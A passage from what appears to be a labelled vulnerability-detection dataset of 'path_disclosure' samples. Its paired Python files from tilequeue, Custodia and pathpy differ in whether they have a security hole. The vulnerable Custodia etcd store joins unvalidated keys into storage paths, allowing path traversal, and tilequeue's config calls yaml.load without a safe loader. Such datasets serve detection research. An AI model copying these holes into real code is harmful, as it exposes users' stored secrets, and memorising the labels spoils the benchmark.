meters_per_pixel_dim):\n    return dict(\n        point=bounds,\n        line=bounds,\n        polygon=bounds,\n    )\n\n\ndef create_query_bounds_pad_fn(buffer_cfg, layer_name):\n\n    if not buffer_cfg:\n        return _bounds_pad_no_buf\n\n    buf_by_type = dict(\n        point=0,\n        line=0,\n        polygon=0,\n    )\n\n    for format_ext, format_cfg in buffer_cfg.items():\n        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)\n        format_geometry_cfg = format_cfg.get('geometry', {})\n        if format_layer_cfg:\n            for geometry_type, buffer_size in format_layer_cfg.items():\n                buf_by_type[geometry_type] = max(\n                    buf_by_type[geometry_type], buffer_size)\n        if format_geometry_cfg:\n            for geometry_type, buffer_size in format_geometry_cfg.items():\n                buf_by_type[geometry_type] = max(\n                    buf_by_type[geometry_type], buffer_size)\n\n    if (buf_by_type['point'] ==\n            buf_by_type['line'] ==\n            buf_by_type['polygon'] == 0):\n        return _bounds_pad_no_buf\n\n    def bounds_pad(bounds, meters_per_pixel_dim):\n        buffered_by_type = {}\n        for geometry_type in ('point', 'line', 'polygon'):\n            offset = meters_per_pixel_dim * buf_by_type[geometry_type]\n            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)\n        return buffered_by_type\n\n    return bounds_pad\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "75f9e819e7e5c2132d29e5236739fae847279b32", "code": "/tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer\nfrom tilequeue.tile import metatile_zoom_from_size\nfrom yaml import load\nimport os\n\n\nclass Configuration(object):\n    '''\n    Flatten configuration from yaml\n    '''\n\n    def __init__(self, yml):\n        self.yml = yml\n\n        self.aws_access_key_id = \\\n            self._cfg('aws credentials aws_access_key_id') or \\\n            os.environ.get('AWS_ACCESS_KEY_ID')\n        self.aws_secret_access_key = \\\n            self._cfg('aws credentials aws_secret_access_key') or \\\n            os.environ.get('AWS_SECRET_ACCESS_KEY')\n\n        self.queue_cfg = self.yml['queue']\n\n        self.store_type = self._cfg('store type')\n        self.s3_bucket = self._cfg('store name')\n        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')\n        self.s3_path = self._cfg('store path')\n        self.s3_date_prefix = self._cfg('store date-prefix')\n        self.s3_delete_retry_interval = \\\n            self._cfg('store delete-retry-interval')\n\n        seed_cfg = self.yml['tiles']['seed']\n        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']\n        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']\n        self.seed_n_threads = seed_cfg['n-threads']\n\n        seed_metro_cfg = seed_cfg['metro-extract']\n        self.seed_metro_extract_url = seed_metro_cfg['url']\n        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']\n        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']\n        self.seed_metro_extract_cities = seed_metro_cfg['cities']\n\n        seed_top_tiles_cfg = seed_cfg['top-tiles']\n        self.seed_top_tiles_url = seed_top_tiles_cfg['url']\n        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']\n        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']\n\n        toi_store_cfg = self.yml['toi-store']\n        self.toi_store_type = toi_store_cfg['type']\n        if self.toi_store_type == 's3':\n            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']\n            self.toi_store_s3_key = toi_store_cfg['s3']['key']\n        elif self.toi_store_type == 'file':\n            self.toi_store_file_name = toi_store_cfg['file']['name']\n\n        self.seed_should_add_to_tiles_of_interest = \\\n            seed_cfg['should-add-to-tiles-of-interest']\n\n        seed_custom = seed_cfg['custom']\n        self.seed_custom_zoom_start = seed_custom['zoom-start']\n        self.seed_custom_zoom_until = seed_custom['zoom-until']\n        self.seed_custom_bboxes = seed_custom['bboxes']\n        if self.seed_custom_bboxes:\n            for bbox in self.seed_custom_bboxes:\n                assert len(bbox) == 4, (\n                    'Seed config: custom bbox {} does not have exactly '\n                    'four elements!').format(bbox)\n                min_x, min_y, max_x, max_y = bbox\n                assert min_x < max_x, \\\n                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)\n                assert min_y < max_y, \\\n                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)\n\n        self.seed_unique = seed_cfg['unique']\n\n        intersect_cfg = self.yml['tiles']['intersect']\n        self.intersect_expired_tiles_location = (\n            intersect_cfg['expired-location'])\n        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']\n\n        self.logconfig = self._cfg('logging config')\n        self.redis_type = self._cfg('redis type')\n        self.redis_host = self._cfg('redis host')\n        self.redis_port = self._cfg('redis port')\n        self.redis_db = self._cfg('redis db')\n        self.redis_cache_set_key = self._cfg('redis cache-set-key')\n\n        self.statsd_host = None\n        if self.yml.get('statsd'):\n            self.statsd_host = self._cfg('statsd host')\n            self.statsd_port = self._cfg('statsd port')\n            self.statsd_prefix = self._cfg('statsd prefix')\n\n        process_cfg = self.yml['process']\n        self.n_simultaneous_query_sets = \\\n            process_cfg['n-simultaneous-query-sets']\n        self.n_simultaneous_s3_storage = \\\n            process_cfg['n-simultaneous-s3-storage']\n        self.log_queue_sizes = process_cfg['log-queue-sizes']\n        self.log_queue_sizes_interval_seconds = \\\n            process_cfg['log-queue-sizes-interval-seconds']\n        self.query_cfg = process_cfg['query-config']\n        self.template_path = process_cfg['template-path']\n        self.reload_templates = process_cfg['reload-templates']\n        self.output_formats = process_cfg['formats']\n        self.buffer_cfg = process_cfg['buffer']\n        self.process_yaml_cfg = process_cfg['yaml']\n\n        self.postgresql_conn_info = self.yml['postgresql']\n        dbnames = self.postgresql_conn_info.get('dbnames')\n        assert dbnames is not None, 'Missing postgresql dbnames'\n        assert isinstance(dbnames, (tuple, list)), \\\n            \"Expecting postgresql 'dbnames' to be a list\"\n        assert len(dbnames) > 0, 'No postgresql dbnames configured'\n\n        self.wof = self.yml.get('wof')\n\n        self.metatile_size = self._cfg('metatile size')\n        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)\n        self.metatile_start_zoom = self._cfg('metatile start-zoom')\n\n        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')\n        assert self.max_zoom_with_changes > self.metatile_zoom\n        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom\n\n        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')\n        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')\n        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')\n\n        self.tile_traffic_log_path = self._cfg(\n            'toi-prune tile-traffic-log-path')\n\n        self.group_by_zoom = self.subtree('rawr group-zoom')\n\n    def _cfg(self, yamlkeys_str):\n        yamlkeys = yamlkeys_str.split()\n        yamlval = self.yml\n        for subkey in yamlkeys:\n            yamlval = yamlval[subkey]\n        return yamlval\n\n    def subtree(self, yamlkeys_str):\n        yamlkeys = yamlkeys_str.split()\n        yamlval = self.yml\n        for subkey in yamlkeys:\n            yamlval = yamlval.get(subkey)\n            if yamlval is None:\n                break\n        return yamlval\n\n\ndef default_yml_config():\n    return {\n        'queue': {\n            'name': None,\n            'type': 'sqs',\n            'timeout-seconds': 20\n        },\n        'store': {\n            'type': 's3',\n            'name': None,\n            'path': 'osm',\n            'reduced-redundancy': False,\n            'date-prefix': '',\n            'delete-retry-interval': 60,\n        },\n        'aws': {\n            'credentials': {\n                'aws_access_key_id': None,\n                'aws_secret_access_key': None,\n            }\n        },\n        'tiles': {\n            'seed': {\n                'all': {\n                    'zoom-start': None,\n                    'zoom-until': None,\n                },\n                'metro-extract': {\n                    'url': None,\n                    'zoom-start': None,\n                    'zoom-until': None,\n                    'cities': None\n                },\n                'top-tiles': {\n                    'url': None,\n                    'zoom-start': None,\n                    'zoom-until': None,\n                },\n                'custom': {\n                    'zoom-start': None,\n                    'zoom-until': None,\n                    'bboxes': []\n                },\n                'should-add-to-tiles-of-interest': True,\n                'n-threads': 50,\n                'unique': True,\n            },\n            'intersect': {\n                'expired-location': None,\n                'parent-zoom-until': None,\n            },\n            'max-zoom-with-changes': 16,\n        },\n        'toi-store': {\n            'type': None,\n        },\n        'toi-prune': {\n            'tile-traffic-log-path': '/tmp/tile-traffic.log',\n        },\n        'process': {\n            'n-simultaneous-query-sets': 0,\n            'n-simultaneous-s3-storage': 0,\n            'log-queue-sizes': True,\n            'log-queue-sizes-interval-seconds': 10,\n            'query-config': None,\n            'template-path': None,\n            'reload-templates': False,\n            'formats': ['json'],\n            'buffer': {},\n            'yaml': {\n                'type': None,\n                'parse': {\n                    'path': '',\n                },\n                'callable': {\n                    'dotted-name': '',\n                },\n            },\n        },\n        'logging': {\n            'config': None\n        },\n        'redis': {\n            'host': 'localhost',\n            'port': 6379,\n            'db': 0,\n            'cache-set-key': 'tilequeue.tiles-of-interest',\n            'type': 'redis_client',\n        },\n        'postgresql': {\n            'host': 'localhost',\n            'port': 5432,\n            'dbnames': ('osm',),\n            'user': 'osm',\n            'password': None,\n        },\n        'metatile': {\n            'size': None,\n            'start-zoom': 0,\n        },\n        'queue_buffer_size': {\n            'sql': None,\n            'proc': None,\n            's3': None,\n        },\n    }\n\n\ndef merge_cfg(dest, source):\n    for k, v in source.items():\n        if isinstance(v, dict):\n            subdest = dest.setdefault(k, {})\n            merge_cfg(subdest, v)\n        else:\n            dest[k] = v\n    return dest\n\n\ndef _override_cfg(container, yamlkeys, value):\n    \"\"\"\n    Override a hierarchical key in the config, setting it to the value.\n\n    Note that yamlkeys should be a non-empty list of strings.\n    \"\"\"\n\n    key = yamlkeys[0]\n    rest = yamlkeys[1:]\n\n    if len(rest) == 0:\n        # no rest means we found the key to update.\n        container[key] = value\n\n    elif key in container:\n        # still need to find the leaf in the tree, so recurse.\n        _override_cfg(container, rest, value)\n\n    else:\n        # need to create a sub-tree down to the leaf to insert into.\n        subtree = {}\n        _override_cfg(subtree, rest, value)\n        container[key] = subtree\n\n\ndef _make_yaml_key(s):\n    \"\"\"\n    Turn an environment variable into a yaml key\n\n    Keys in YAML files are generally lower case and use dashes instead of\n    underscores. This isn't a universal rule, though, so we'll have to\n    either change the keys to conform to this, or have some way of indicating\n    this from the environment.\n    \"\"\"\n\n    return s.lower().replace(\"_\", \"-\")\n\n\ndef make_config_from_argparse(config_file_handle, default_yml=None):\n    if default_yml is None:\n        default_yml = default_yml_config()\n\n    # override defaults from config file\n    yml_data = load(config_file_handle)\n    cfg = merge_cfg(default_yml, yml_data)\n\n    # override config file with values from the environment\n    for k in os.environ:\n        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the\n        # _double_ underscores), which will decode the value as YAML and insert\n        # it in cfg['foo']['bar'].\n        #\n        # TODO: should the prefix TILEQUEUE be configurable?\n        if k.startswith('TILEQUEUE__'):\n            keys = map(_make_yaml_key, k.split('__')[1:])\n            value = load(os.environ[k])\n            _override_cfg(cfg, keys, value)\n\n    return Configuration(cfg)\n\n\ndef _bounds_pad_no_buf(bounds, meters_per_pixel_dim):\n    return dict(\n        point=bounds,\n        line=bounds,\n        polygon=bounds,\n    )\n\n\ndef create_query_bounds_pad_fn(buffer_cfg, layer_name):\n\n    if not buffer_cfg:\n        return _bounds_pad_no_buf\n\n    buf_by_type = dict(\n        point=0,\n        line=0,\n        polygon=0,\n    )\n\n    for format_ext, format_cfg in buffer_cfg.items():\n        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)\n        format_geometry_cfg = format_cfg.get('geometry', {})\n        if format_layer_cfg:\n            for geometry_type, buffer_size in format_layer_cfg.items():\n                buf_by_type[geometry_type] = max(\n                    buf_by_type[geometry_type], buffer_size)\n        if format_geometry_cfg:\n            for geometry_type, buffer_size in format_geometry_cfg.items():\n                buf_by_type[geometry_type] = max(\n                    buf_by_type[geometry_type], buffer_size)\n\n    if (buf_by_type['point'] ==\n            buf_by_type['line'] ==\n            buf_by_type['polygon'] == 0):\n        return _bounds_pad_no_buf\n\n    def bounds_pad(bounds, meters_per_pixel_dim):\n        buffered_by_type = {}\n        for geometry_type in ('point', 'line', 'polygon'):\n            offset = meters_per_pixel_dim * buf_by_type[geometry_type]\n            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)\n        return buffered_by_type\n\n    return bounds_pad\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "785fc87f38b4811bc4ce43a0a9b2267ee7d500b4", "code": "custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file\n\nfrom __future__ import print_function\n\nimport sys\n\nimport etcd\n\nfrom custodia.store.interface import CSStore, CSStoreError, CSStoreExists\n\n\ndef log_error(error):\n    print(error, file=sys.stderr)\n\n\nclass EtcdStore(CSStore):\n\n    def __init__(self, config):\n        self.server = config.get('etcd_server', '127.0.0.1')\n        self.port = int(config.get('etcd_port', 4001))\n        self.namespace = config.get('namespace', \"/custodia\")\n\n        # Initialize the DB by trying to create the default table\n        try:\n            self.etcd = etcd.Client(self.server, self.port)\n            self.etcd.write(self.namespace, None, dir=True)\n        except etcd.EtcdNotFile:\n            # Already exists\n            pass\n        except etcd.EtcdException as err:\n            log_error(\"Error creating namespace %s: [%r]\" % (self.namespace,\n                                                             repr(err)))\n            raise CSStoreError('Error occurred while trying to init db')\n\n    def _absolute_key(self, key):\n        \"\"\"Get absolute path to key and validate key\"\"\"\n        if '//' in key:\n            raise ValueError(\"Invalid empty components in key '%s'\" % key)\n        parts = key.split('/')\n        if set(parts).intersection({'.', '..'}):\n            raise ValueError(\"Invalid relative components in key '%s'\" % key)\n        return '/'.join([self.namespace] + parts).replace('//', '/')\n\n    def get(self, key):\n        try:\n            result = self.etcd.get(self._absolute_key(key))\n        except etcd.EtcdException as err:\n            log_error(\"Error fetching key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to get key')\n        return result.value\n\n    def set(self, key, value, replace=False):\n        path = self._absolute_key(key)\n        try:\n            self.etcd.write(path, value, prevExist=replace)\n        except etcd.EtcdAlreadyExist as err:\n            raise CSStoreExists(str(err))\n        except etcd.EtcdException as err:\n            log_error(\"Error storing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to store key')\n\n    def span(self, key):\n        path = self._absolute_key(key)\n        try:\n            self.etcd.write(path, None, dir=True, prevExist=False)\n        except etcd.EtcdAlreadyExist as err:\n            raise CSStoreExists(str(err))\n        except etcd.EtcdException as err:\n            log_error(\"Error storing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to store key')\n\n    def list(self, keyfilter='/'):\n        path = self._absolute_key(keyfilter)\n        if path != '/':\n            path = path.rstrip('/')\n        try:\n            result = self.etcd.read(path, recursive=True)\n        except etcd.EtcdKeyNotFound:\n            return None\n        except etcd.EtcdException as err:\n            log_error(\"Error listing %s: [%r]\" % (keyfilter, repr(err)))\n            raise CSStoreError('Error occurred while trying to list keys')\n\n        value = set()\n        for entry in result.get_subtree():\n            if entry.key == path:\n                continue\n            name = entry.key[len(path):]\n            if entry.dir and not name.endswith('/'):\n                name += '/'\n            value.add(name.lstrip('/'))\n        return sorted(value)\n\n    def cut(self, key):\n        try:\n            self.etcd.delete(self._absolute_key(key))\n        except etcd.EtcdKeyNotFound:\n            return False\n        except etcd.EtcdException as err:\n            log_error(\"Error removing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to cut key')\n        return True\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "785fc87f38b4811bc4ce43a0a9b2267ee7d500b4", "code": "/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file\n\nfrom __future__ import print_function\n\nimport os\nimport sys\n\nimport etcd\n\nfrom custodia.store.interface import CSStore, CSStoreError, CSStoreExists\n\n\ndef log_error(error):\n    print(error, file=sys.stderr)\n\n\nclass EtcdStore(CSStore):\n\n    def __init__(self, config):\n        self.server = config.get('etcd_server', '127.0.0.1')\n        self.port = int(config.get('etcd_port', 4001))\n        self.namespace = config.get('namespace', \"/custodia\")\n\n        # Initialize the DB by trying to create the default table\n        try:\n            self.etcd = etcd.Client(self.server, self.port)\n            self.etcd.write(self.namespace, None, dir=True)\n        except etcd.EtcdNotFile:\n            # Already exists\n            pass\n        except etcd.EtcdException as err:\n            log_error(\"Error creating namespace %s: [%r]\" % (self.namespace,\n                                                             repr(err)))\n            raise CSStoreError('Error occurred while trying to init db')\n\n    def get(self, key):\n        try:\n            result = self.etcd.get(os.path.join(self.namespace, key))\n        except etcd.EtcdException as err:\n            log_error(\"Error fetching key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to get key')\n        return result.value\n\n    def set(self, key, value, replace=False):\n        path = os.path.join(self.namespace, key)\n        try:\n            self.etcd.write(path, value, prevExist=replace)\n        except etcd.EtcdAlreadyExist as err:\n            raise CSStoreExists(str(err))\n        except etcd.EtcdException as err:\n            log_error(\"Error storing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to store key')\n\n    def span(self, key):\n        path = os.path.join(self.namespace, key)\n        try:\n            self.etcd.write(path, None, dir=True, prevExist=False)\n        except etcd.EtcdAlreadyExist as err:\n            raise CSStoreExists(str(err))\n        except etcd.EtcdException as err:\n            log_error(\"Error storing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to store key')\n\n    def list(self, keyfilter='/'):\n        path = os.path.join(self.namespace, keyfilter)\n        if path != '/':\n            path = path.rstrip('/')\n        try:\n            result = self.etcd.read(path, recursive=True)\n        except etcd.EtcdKeyNotFound:\n            return None\n        except etcd.EtcdException as err:\n            log_error(\"Error listing %s: [%r]\" % (keyfilter, repr(err)))\n            raise CSStoreError('Error occurred while trying to list keys')\n\n        value = set()\n        for entry in result.get_subtree():\n            if entry.key == path:\n                continue\n            name = entry.key[len(path):]\n            if entry.dir and not name.endswith('/'):\n                name += '/'\n            value.add(name.lstrip('/'))\n        return sorted(value)\n\n    def cut(self, key):\n        try:\n            self.etcd.delete(os.path.join(self.namespace, key))\n        except etcd.EtcdKeyNotFound:\n            return False\n        except etcd.EtcdException as err:\n            log_error(\"Error removing key %s: [%r]\" % (key, repr(err)))\n            raise CSStoreError('Error occurred while trying to cut key')\n        return True\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "13360e223925e21d02d6132d342c47fe53abc994", "code": "pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-\n\"\"\"\n    pathpy is an OpenSource python package for the analysis of time series data\n    on networks using higher- and multi order graphical models.\n\n    Copyright (C) 2016-2017 Ingo Scholtes, ETH Z\u00fcrich\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU Affero General Public License as published\n    by the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU Affero General Public License for more details.\n\n    You should have received a copy of the GNU Affero General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n    Contact the developer:\n\n    E-mail: ischoltes@ethz.ch\n    Web:    http://www.ingoscholtes.net\n\"\"\"\n\nimport collections as _co\nimport bisect as _bs\nimport itertools as _iter\n\nimport numpy as _np\n\nimport scipy.sparse as _sparse\nimport scipy.sparse.linalg as _sla\nimport scipy.linalg as _la\nimport scipy as _sp\n\nfrom pathpy.Log import Log\nfrom pathpy.Log import Severity\n\n\nclass EmptySCCError(Exception):\n    \"\"\"\n    This exception is thrown whenever a non-empty strongly\n    connected component is needed, but we encounter an empty one\n    \"\"\"\n    pass\n\n\nclass HigherOrderNetwork:\n    \"\"\"\n    Instances of this class capture a k-th-order representation\n    of path statistics. Path statistics can originate from pathway\n    data, temporal networks, or from processes observed on top\n    of a network topology.\n    \"\"\"\n\n\n    def __init__(self, paths, k=1, separator='-', nullModel=False,\n        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):\n        \"\"\"\n        Generates a k-th-order representation based on the given path statistics.\n\n        @param paths: An instance of class Paths, which contains the path\n            statistics to be used in the generation of the k-th order\n            representation\n\n        @param k: The order of the network representation to generate.\n            For the default case of k=1, the resulting representation\n            corresponds to the usual (first-order) aggregate network,\n            i.e. links connect nodes and link weights are given by the\n            frequency of each interaction. For k>1, a k-th order node\n            corresponds to a sequence of k nodes. The weight of a k-th\n            order link captures the frequency of a path of length k.\n\n        @param separator: The separator character to be used in\n            higher-order node names.\n\n        @param nullModel: For the default value False, link weights are\n            generated based on the statistics of paths of length k in the\n            underlying path statistics instance. If True, link weights are\n            generated from the first-order model (k=1) based on the assumption\n            of independent links (i.e. corresponding) to a first-order\n            Markov model.\n\n        @param method: specifies how the null model link weights\n            in the k-th order model are calculated. For the default\n            method='FirstOrderTransitions', the weight\n            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge\n            is set to the transition probability T['v_k', 'v_k+1'] in the\n            first order network. For method='KOrderPi' the entry\n            pi['v1-...-v_k'] in the stationary distribution of the\n            k-order network is used instead.\n        \"\"\"\n\n        assert not nullModel or (nullModel and k > 1)\n\n        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \\\n            'Error: unknown method to build null model'\n\n        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \\\n            'Error: constructing a model of order k requires paths of at least length k'\n\n        ## The order of this HigherOrderNetwork\n        self.order = k\n\n        ## The paths object used to generate this instance\n        self.paths = paths\n\n        ## The nodes in this HigherOrderNetwork\n        self.nodes = []\n\n        ## The separator character used to label higher-order nodes.\n        ## For separator '-', a second-order node will be 'a-b'.\n        self.separator = separator\n\n        ## A dictionary containing the sets of successors of all nodes\n        self.successors = _co.defaultdict(lambda: set())\n\n        ## A dictionary containing the sets of predecessors of all nodes\n        self.predecessors = _co.defaultdict(lambda: set())\n\n        ## A dictionary containing the out-degrees of all nodes\n        self.outdegrees = _co.defaultdict(lambda: 0.0)\n\n        ## A dictionary containing the in-degrees of all nodes\n        self.indegrees = _co.defaultdict(lambda: 0.0)\n\n        # NOTE: edge weights, as well as in- and out weights of nodes are \n        # numpy arrays consisting of two weight components [w0, w1]. w0 \n        # counts the weight of an edge based on its occurrence in a subpaths \n        # while w1 counts the weight of an edge based on its occurrence in \n        # a longest path. As an illustrating example, consider the single \n        # path a -> b -> c. In the first-order network, the weights of edges \n        # (a,b) and (b,c) are both (1,0). In the second-order network, the \n        # weight of edge (a-b, b-c) is (0,1).\n\n        ## A dictionary containing edges as well as edge weights\n        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))\n\n        ## A dictionary containing the weighted in-degrees of all nodes\n        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        \n\n        ## A dictionary containing the weighted out-degrees of all nodes\n        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        \n\n        if k > 1:\n            # For k>1 we need the first-order network to generate the null model\n            # and calculate the degrees of freedom\n\n            # For a multi-order model, the first-order network is generated multiple times!\n            # TODO: Make this more efficient\n            g1 = HigherOrderNetwork(paths, k=1)\n            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)\n\n        if not nullModel:\n            # Calculate the frequency of all paths of\n            # length k, generate k-order nodes and set\n            # edge weights accordingly\n            node_set = set()\n            iterator = paths.paths[k].items()\n\n            if k==0:\n                # For a 0-order model, we generate a dummy start node\n                node_set.add('start')\n                for key, val in iterator:\n                    w = key[0]\n                    node_set.add(w)\n                    self.edges[('start',w)] += val\n                    self.successors['start'].add(w)\n                    self.predecessors[w].add('start')\n                    self.indegrees[w] = len(self.predecessors[w])\n                    self.inweights[w] += val\n                    self.outdegrees['start'] = len(self.successors['start'])\n                    self.outweights['start'] += val\n            else:\n                for key, val in iterator:\n                    # Generate names of k-order nodes v and w\n                    v = separator.join(key[0:-1]) \n                    w = separator.join(key[1:])\n                    node_set.add(v)\n                    node_set.add(w)\n                    self.edges[(v,w)] += val\n                    self.successors[v].add(w)\n                    self.predecessors[w].add(v)\n                    self.indegrees[w] = len(self.predecessors[w])\n                    self.inweights[w] += val\n                    self.outdegrees[v] = len(self.successors[v])\n                    self.outweights[v] += val\n\n            self.nodes = list(node_set)\n\n            # Note: For all sequences of length k which (i) have never been observed, but\n            #       (ii) do actually represent paths of length k in the first-order network,\n            #       we may want to include some 'escape' mechanism along the\n            #       lines of (Cleary and Witten 1994)\n\n        else:\n            # generate the *expected* frequencies of all possible\n            # paths based on independently occurring (first-order) links\n\n            # generate all possible paths of length k\n            # based on edges in the first-order network\n            possiblePaths = list(g1.edges.keys())\n\n            for _ in range(k-1):\n                E_new = list()\n                for e1 in possiblePaths:\n                    for e2 in g1.edges:\n                        if e1[-1] == e2[0]:\n                            p = e1 + (e2[1],)\n                            E_new.append(p)\n                possiblePaths = E_new\n\n            # validate that the number of unique generated paths corresponds to the sum of entries in A**k\n            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \\\n                ' paths but got ' + str(len(possiblePaths))\n\n            if method == 'KOrderPi':\n                # compute stationary distribution of a random walker in the k-th order network\n                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)\n                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),\n                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)\n            else:\n                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)\n                T = g1.getTransitionMatrix(includeSubPaths=True)\n\n            # assign link weights in k-order null model\n            for p in possiblePaths:\n                v = p[0]\n                # add k-order nodes and edges\n                for l in range(1, k):\n                    v = v + separator + p[l]\n                w = p[1]\n                for l in range(2, k+1):\n                    w = w + separator + p[l]\n                if v not in self.nodes:\n                    self.nodes.append(v)\n                if w not in self.nodes:\n                    self.nodes.append(w)\n\n                # NOTE: under the null model's assumption of independent events, we\n                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)\n                # In other words: we are encoding a k-1-order Markov process in a k-order\n                # Markov model and for the transition probabilities T_AB in the k-order model\n                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)\n\n                # Solution A: Use entries of stationary distribution,\n                # which give stationary visitation frequencies of k-order node w\n                if method == 'KOrderPi':\n                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])\n\n                # Solution B: Use relative edge weight in first-order network\n                # Note that A is *not* transposed\n                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()\n\n                # Solution C: Use transition probability in first-order network\n                # Note that T is transposed (!)\n                elif method == 'FirstOrderTransitions':\n                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]\n                    self.edges[(v, w)] = _np.array([0, p_vw])\n\n                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix\n\n                # Note: Solution B and C are equivalent\n                self.successors[v].add(w)\n                self.indegrees[w] = len(self.predecessors[w])\n                self.inweights[w] += self.edges[(v, w)]\n                self.outdegrees[v] = len(self.successors[v])\n                self.outweights[v] += self.edges[(v, w)]\n\n        # Compute degrees of freedom of models\n        if k == 0:\n            # for a zero-order model, we just fit node probabilities\n            # (excluding the special 'start' node)\n            # Since probabilities must sum to one, the effective degree\n            # of freedom is one less than the number of nodes\n            # This holds for both the paths and the ngrams model\n            self.dof_paths = self.vcount() - 2\n            self.dof_ngrams = self.vcount() - 2\n        else:\n            # for a first-order model, self is the first-order network\n            if k == 1:\n                g1 = self\n                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)\n\n            # Degrees of freedom in a higher-order ngram model\n            s = g1.vcount()\n\n            ## The degrees of freedom of the higher-order model, under the ngram assumption\n            self.dof_ngrams = (s**k)*(s-1)\n\n            # For k>0, the degrees of freedom of a path-based model depend on\n            # the number of possible paths of length k in the first-order network.\n            # Since probabilities in each row must sum to one, the degrees\n            # of freedom must be reduced by one for each k-order node\n            # that has at least one possible transition.\n\n            # (A**k).sum() counts the number of different paths of exactly length k\n            # based on the first-order network, which corresponds to the number of\n            # possible transitions in the transition matrix of a k-th order model.\n            paths_k = (A**k).sum()\n\n            # For the degrees of freedom, we must additionally consider that\n            # rows in the transition matrix must sum to one, i.e. we have to\n            # subtract one degree of freedom for every non-zero row in the (null-model)\n            # transition matrix. In other words, we subtract one for every path of length k-1\n            # that can possibly be followed by at least one edge to a path of length k\n\n            # This can be calculated by counting the number of non-zero elements in the\n            # vector containing the row sums of A**k\n            non_zero = _np.count_nonzero((A**k).sum(axis=0))\n\n            ## The degrees of freedom of the higher-order model, under the paths assumption\n            self.dof_paths = paths_k - non_zero\n\n\n    def vcount(self):\n        \"\"\" Returns the number of nodes \"\"\"\n        return len(self.nodes)\n\n\n    def ecount(self):\n        \"\"\" Returns the number of links \"\"\"\n        return len(self.edges)\n\n\n    def totalEdgeWeight(self):\n        \"\"\" Returns the sum of all edge weights \"\"\"\n        if self.edges:\n            return sum(self.edges.values())\n        return _np.array([0, 0])\n\n\n    def modelSize(self):\n        \"\"\"\n        Returns the number of non-zero elements in the adjacency matrix\n        of the higher-order model.\n        \"\"\"\n        return self.getAdjacencyMatrix().count_nonzero()\n\n\n    def HigherOrderNodeToPath(self, node):\n        \"\"\"\n        Helper function that transforms a node in a\n        higher-order network of order k into a corresponding\n        path of length k-1. For a higher-order node 'a-b-c-d'\n        this function will return ('a','b','c','d')\n\n        @param node: The higher-order node to be transformed to a path.\n        \"\"\"\n        return tuple(node.split(self.separator))\n\n\n    def pathToHigherOrderNodes(self, path, k=None):\n        \"\"\"\n        Helper function that transforms a path into a sequence of k-order nodes\n        using the separator character of the HigherOrderNetwork instance\n\n        Consider an example path (a,b,c,d) with a separator string 